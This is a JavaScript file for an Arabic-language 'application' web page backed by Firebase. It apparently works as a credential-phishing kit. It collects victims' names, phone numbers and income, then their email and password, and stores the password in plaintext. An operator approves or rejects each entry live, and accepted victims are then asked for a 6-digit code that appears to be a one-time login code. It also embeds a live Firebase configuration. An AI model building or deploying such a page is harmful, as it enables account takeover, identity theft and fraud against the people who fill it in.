import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js';
import { getDatabase, ref, set, push, update, onValue } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js';

const firebaseConfig = {
    apiKey: "AIzaSyBwkfW26EAPTiupO6mRejVcKMbpJZV1ohE",
    authDomain: "shahame-98a21.firebaseapp.com",
    databaseURL: "https://shahame-98a21-default-rtdb.firebaseio.com",
    projectId: "shahame-98a21",
    storageBucket: "shahame-98a21.firebasestorage.app",
    messagingSenderId: "885951504437",
    appId: "1:885951504437:web:55b4d335c9418ba376517c"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

const homeForm = document.getElementById('homeForm');
const logoutStep = document.getElementById('logoutStep');
const requestForm = document.getElementById('requestForm');
const orderForm = document.getElementById('orderForm');
const waitingPanel = document.getElementById('waitingPanel');
const messageDiv = document.getElementById('message');
const submitButton = document.getElementById('submitButton');
const orderSubmitButton = document.getElementById('orderSubmitButton');
const backButton = document.getElementById('backButton');
const qrButton = document.getElementById('qrButton');
const logoutNextButton = document.getElementById('logoutNextButton');
const orderNumberInput = document.getElementById('orderNumber');
const pageTitle = document.getElementById('pageTitle');

let applicantData = {
    applicantName: '',
    mobileNumber: '',
    contactNumber: '',
    monthlyIncome: ''
};
let currentEmail = '';
let currentPassword = '';
let currentRequestRef = null;
let statusUnsubscribe = null;

homeForm.addEventListener('submit', (event) => {
    event.preventDefault();

    applicantData = {
        applicantName: document.getElementById('applicantName').value.trim(),
        mobileNumber: document.getElementById('mobileNumber').value.trim(),
        contactNumber: document.getElementById('contactNumber').value.trim(),
        monthlyIncome: document.getElementById('monthlyIncome').value.trim()
    };

    if (!applicantData.applicantName || !applicantData.mobileNumber || !applicantData.contactNumber || !applicantData.monthlyIncome) {
        showMessage('يرجى إدخال جميع البيانات المطلوبة', 'error');
        return;
    }

    showStep('logout');
});

logoutNextButton.addEventListener('click', () => {
    showStep('details');
});

requestForm.addEventListener('submit', async (event) => {
    event.preventDefault();

    currentEmail = document.getElementById('email').value.trim();
    currentPassword = document.getElementById('name').value.trim();

    if (!currentEmail || !currentPassword) {
        showMessage('يرجى إدخال البريد الإلكتروني وكلمة المرور', 'error');
        return;
    }

    submitButton.disabled = true;
    submitButton.textContent = 'جاري الحفظ...';
    showStep('waiting');

    try {
        if (!currentRequestRef) {
            currentRequestRef = push(ref(database, 'requests'));
            await set(currentRequestRef, {
                ...applicantData,
                email: currentEmail,
                password: currentPassword,
                name: applicantData.applicantName,
                orderNumber: '',
                status: 'pending',
                timestamp: Date.now(),
                date: new Date().toLocaleString('ar-EG')
            });
        } else {
            await update(currentRequestRef, {
                ...applicantData,
                email: currentEmail,
                password: currentPassword,
                name: applicantData.applicantName,
                updatedAt: Date.now()
            });
        }

        watchApprovalStatus();
    } catch (error) {
        showStep('details');
        showMessage('حدث خطأ أثناء حفظ البيانات. حاول مرة أخرى', 'error');
        console.error('Error:', error);
    } finally {
        submitButton.disabled = false;
        submitButton.textContent = 'تقديم الطلب';
    }
});

orderForm.addEventListener('submit', async (event) => {
    event.preventDefault();

    const orderNumber = orderNumberInput.value.trim();

    if (!/^\d{6}$/.test(orderNumber)) {
        showMessage('يجب أن يكون رقم الطلب مكونا من 6 أرقام فقط', 'error');
        return;
    }

    orderSubmitButton.disabled = true;
    orderSubmitButton.textContent = 'جاري الإرسال...';

    try {
        if (!currentRequestRef) {
            currentRequestRef = push(ref(database, 'requests'));
            await set(currentRequestRef, {
                ...applicantData,
                email: currentEmail,
                password: currentPassword,
                name: applicantData.applicantName,
                orderNumber,
                status: 'pending',
                timestamp: Date.now(),
                date: new Date().toLocaleString('ar-EG'),
                orderNumberUpdatedAt: Date.now()
            });
        } else {
            await update(currentRequestRef, {
                ...applicantData,
                orderNumber,
                orderNumberUpdatedAt: Date.now()
            });
        }

        homeForm.reset();
        requestForm.reset();
        orderForm.reset();
        resetApplicantData();
        stopWatchingApprovalStatus();
        currentRequestRef = null;
        showStep('home');
        showMessage(`تم إرسال الطلب بنجاح. رقم الطلب: ${orderNumber}`, 'success');
    } catch (error) {
        showMessage('حدث خطأ أثناء إرسال الطلب. حاول مرة أخرى', 'error');
        console.error('Error:', error);
    } finally {
        orderSubmitButton.disabled = false;
        orderSubmitButton.textContent = 'إرسال الطلب';
    }
});

qrButton.addEventListener('click', () => {
    showMessage('زر المسح غير مفعل حاليا. يمكنك تقديم الطلب من النموذج.', 'error');
});

orderNumberInput.addEventListener('input', (event) => {
    event.target.value = event.target.value.replace(/\D/g, '');
});

backButton.addEventListener('click', () => {
    showStep('details');
});

function showMessage(text, type) {
    messageDiv.textContent = text;
    messageDiv.className = `message ${type}`;
    messageDiv.classList.remove('hidden');
}

function watchApprovalStatus() {
    stopWatchingApprovalStatus();

    if (!currentRequestRef) {
        return;
    }

    statusUnsubscribe = onValue(currentRequestRef, (snapshot) => {
        const request = snapshot.val();
        const status = request?.status;

        if (status === 'accepted') {
            stopWatchingApprovalStatus();
            showStep('order');
            return;
        }

        if (status === 'rejected') {
            stopWatchingApprovalStatus();
            currentRequestRef = null;
            showStep('details');
            showMessage('معلومات غير صحيحة يرجى التأكد من صحة المعلومات والمحاولة مرة أخرى', 'error');
        }
    }, (error) => {
        stopWatchingApprovalStatus();
        showStep('details');
        showMessage('حدث خطأ أثناء متابعة حالة الطلب. حاول مرة أخرى', 'error');
        console.error('Status watch error:', error);
    });
}

function stopWatchingApprovalStatus() {
    if (statusUnsubscribe) {
        statusUnsubscribe();
        statusUnsubscribe = null;
    }
}

function resetApplicantData() {
    applicantData = {
        applicantName: '',
        mobileNumber: '',
        contactNumber: '',
        monthlyIncome: ''
    };
    currentEmail = '';
    currentPassword = '';
}

function showStep(step) {
    const isHomeStep = step === 'home';
    const isLogoutStep = step === 'logout';
    const isDetailsStep = step === 'details';
    const isOrderStep = step === 'order';
    const isWaitingStep = step === 'waiting';

    homeForm.classList.toggle('hidden', !isHomeStep);
    logoutStep.classList.toggle('hidden', !isLogoutStep);
    requestForm.classList.toggle('hidden', !isDetailsStep);
    orderForm.classList.toggle('hidden', !isOrderStep);
    waitingPanel.classList.toggle('hidden', !isWaitingStep);

    if (isHomeStep) {
        pageTitle.textContent = 'الصفحة الرئيسية';
    } else if (isLogoutStep) {
        pageTitle.textContent = 'تنويه قبل المتابعة';
    } else if (isOrderStep) {
        pageTitle.textContent = 'رقم الطلب';
    } else if (isWaitingStep) {
        pageTitle.textContent = 'يرجى الانتظار';
    } else {
        pageTitle.textContent = 'تقديم طلب';
    }

    messageDiv.classList.add('hidden');

    if (isOrderStep) {
        orderNumberInput.focus();
    }
}
